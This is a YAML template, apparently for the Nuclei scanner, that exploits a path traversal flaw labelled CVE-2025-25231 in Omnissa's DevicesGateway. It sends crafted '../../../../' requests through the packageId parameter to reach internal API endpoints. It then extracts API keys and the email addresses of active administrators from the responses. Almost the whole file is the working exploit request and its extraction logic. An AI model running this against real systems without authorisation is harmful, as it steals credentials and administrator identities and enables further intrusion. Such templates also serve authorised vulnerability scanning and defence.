id: Omnissa-CVE-2025-25231-pathTravel

info:
  name: Omnissa-CVE-2025-25231-pathTravel
  author: iSee857
  severity: high
  description: |
    Omnissa-CVE-2025-25231-pathTravel.

flow: http(1) || http(2)

http:
  - raw:
      - |
        GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/groups/apikeys%3fogname=Global HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'contains_all(body, "service_name","api_key")'
        condition: and

    extractors:
      - type: json
        name: apiKey
        json:
          - '.api_keys[].api_key'

  - raw:
      - |
        GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/admins/search?status=active%3fogname=Global HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'contains_all(body, "Uuid","Email")'
        condition: and

    extractors:
      - type: regex
        part: body
        name: email
        group: 1
        regex:
          - '<Email>([^<]+)</Email>'
